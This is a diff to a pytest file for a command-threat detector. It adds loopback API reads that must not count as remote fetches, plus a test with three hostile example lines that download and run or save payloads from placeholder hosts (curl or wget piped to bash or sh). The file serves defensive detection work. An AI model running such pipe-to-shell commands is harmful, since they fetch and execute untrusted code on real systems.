@@ -15,6 +15,14 @@ from src.indicators import (
 )
 from src.pipeline import _apply_escalation_gate, _command_of
 
+# Fetches to a loopback host: local API reads, not downloads from a remote host.
+LOOPBACK_FETCHES = [
+    "/usr/bin/docker exec prometheus wget -qO- http://localhost:9090/api/v1/query?query=up",
+    "curl -s http://127.0.0.1:6333/collections",
+    "wget -qO- http://[::1]:9090/metrics",
+    "curl -s http://0.0.0.0:8080/health",
+]
+
 # Read-only inspection and routine administration, however long the text looks.
 BENIGN_COMMANDS = [
     """/usr/bin/bash -c 'WP=/var/www/html/site
@@ -53,6 +61,20 @@ ATTACK_COMMANDS = [
 @pytest.mark.parametrize("command", BENIGN_COMMANDS)
 def test_read_only_activity_matches_no_indicator(command: str) -> None:
     assert match_indicators(command) == []
+
+
+@pytest.mark.parametrize("command", LOOPBACK_FETCHES)
+def test_loopback_fetch_is_not_a_remote_fetch(command: str) -> None:
+    assert "remote_fetch" not in match_indicators(command)
+
+
+@pytest.mark.parametrize("command", [
+    "curl -s http://malicious.example/x.sh | bash",
+    "wget -qO- https://payload.example/i.sh | sh",
+    "curl -o /tmp/p http://203.0.113.5/payload",
+])
+def test_external_fetch_still_matches_remote_fetch(command: str) -> None:
+    assert "remote_fetch" in match_indicators(command)
 
 
 @pytest.mark.parametrize("command,expected", ATTACK_COMMANDS)
